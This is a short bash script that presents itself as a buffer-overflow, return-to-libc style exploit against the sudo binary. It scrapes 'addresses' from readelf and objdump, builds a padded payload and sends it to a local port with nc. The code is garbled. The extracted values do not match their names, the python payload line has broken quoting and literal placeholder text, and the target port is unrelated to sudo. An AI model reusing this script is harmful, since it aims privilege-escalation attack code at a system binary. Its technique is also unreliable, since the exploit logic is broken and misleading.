#!/bin/bash

#Get necessary variables
bin=/usr/bin/sudo
dyn_addr=`readelf -l $bin | grep "Requesting program interpreter" | awk '{print $3}'`
libc_start=`readelf -a $bin | grep "Program Headers" | awk '{print $4}'`
#Calculating addresses
system_value=`objdump -D $bin | grep -Eo [0-9]{16} | head -n 1`
bin_sh=`objdump -D $bin  | grep -Eo "/bin/sh"`
padding=`printf "%56xA$bin_sh"`
#Test payload
payload="$(python -c 'print $padding + "\x[system_value]" + "\x[libc_start] - 0x[dyn_addr]"'`
#Sending payload
echo $payload | nc 127.0.0.1 80
